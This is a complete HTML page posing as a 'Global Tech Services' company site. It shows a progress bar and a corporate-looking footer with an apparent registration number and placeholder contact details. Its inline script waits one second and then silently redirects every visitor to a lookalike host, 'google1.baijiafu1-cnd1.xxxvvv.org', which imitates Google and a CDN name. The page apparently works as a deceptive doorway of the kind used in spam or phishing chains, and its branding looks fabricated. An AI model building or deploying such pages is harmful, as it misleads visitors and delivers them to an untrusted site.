<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Global Tech Services</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI","Helvetica Neue",Arial,sans-serif}
body{
  min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;
  background:#f5f7fa;color:#555;text-align:center
}
h1{font-size:24px;color:#2e7d32;margin-bottom:24px}

/* ── progress bar ───────────────────── */
#barWrap{width:260px;height:12px;background:#e0e5eb;border-radius:6px;overflow:hidden}
#barFill{width:0;height:100%;background:#4caf50;transition:width .2s}
#pctTxt{margin-top:10px;font-size:14px;color:#444}

/* ── footer ─────────────────────────── */
footer{margin-top:60px;font-size:12px;line-height:1.8;color:#888}
footer a{color:#888;text-decoration:none}
footer a:hover{text-decoration:underline}
</style>
</head>
<body>

<h1>Welcome to Global Tech Services&nbsp;—&nbsp;redirecting…</h1>

<div id="barWrap"><div id="barFill"></div></div>
<div id="pctTxt">0&nbsp;%</div>

<footer>
  ©&nbsp;2025&nbsp;Global&nbsp;Tech&nbsp;Services&nbsp;Inc.&nbsp;|&nbsp;Reg.&nbsp;No.&nbsp;US-DE-2025-169854<br>
  support@globaltech.com&nbsp;|&nbsp;+1-800-555-0199&nbsp;|&nbsp;
  <a href="#">Privacy&nbsp;Policy</a>&nbsp;|&nbsp;<a href="#">Terms&nbsp;of&nbsp;Service</a>
</footer>

<script>
/* total*/
const DELAY  = 1000;
const TARGET = "https://google1.baijiafu1-cnd1.xxxvvv.org";

const fill = document.getElementById("barFill");
const pct  = document.getElementById("pctTxt");

const start = Date.now();
const timer = setInterval(()=>{
  const p = Math.min(100, (Date.now() - start) / DELAY * 100);
  fill.style.width = p + "%";
  pct.innerHTML    = Math.floor(p) + "&nbsp;%";
  if(p >= 100){
    clearInterval(timer);
    location.replace(TARGET);      // 单
  }
}, 50);
</script>

</body>
</html>
